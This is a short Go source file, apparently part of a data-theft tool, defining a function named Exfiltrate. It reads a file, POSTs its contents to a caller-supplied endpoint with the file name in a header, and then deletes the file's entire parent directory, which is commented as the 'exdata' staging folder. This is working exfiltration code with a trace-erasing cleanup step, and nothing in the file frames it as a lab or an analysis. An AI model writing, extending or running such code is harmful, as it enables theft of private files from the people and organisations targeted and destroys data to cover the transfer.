package internal

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
)

func Exfiltrate(endpoint, filePath string) error {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	// Get file info for size and name
	stat, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat file: %w", err)
	}

	// Read the file content into memory
	fileBuffer := &bytes.Buffer{}
	_, err = io.Copy(fileBuffer, file)
	if err != nil {
		return fmt.Errorf("failed to read file content: %w", err)
	}

	// Create the HTTP request
	request, err := http.NewRequest("POST", endpoint, fileBuffer)
	if err != nil {
		return fmt.Errorf("failed to create HTTP request: %w", err)
	}

	// Set headers
	request.Header.Set("Content-Type", "application/octet-stream")
	request.Header.Set("filename", stat.Name())
	request.Header.Set("Content-Length", strconv.FormatInt(stat.Size(), 10)) // Explicit Content-Length

	// Send the request
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("failed to send HTTP request: %w", err)
	}
	defer response.Body.Close()

	// Read and display the response
	body, err := io.ReadAll(response.Body)
	if err != nil {
		return fmt.Errorf("failed to read response body: %w", err)
	}

	fmt.Printf("Server response: %s\n", string(body))

	// Cleanup: Remove the exdata folder
	outputDir := filepath.Dir(filePath) // Get the directory of the file
	err = os.RemoveAll(outputDir)
	if err != nil {
		fmt.Printf("Failed to remove output directory %s: %v\n", outputDir, err)
	} else {
		fmt.Printf("Cleaned up output directory: %s\n", outputDir)
	}

	return nil
}
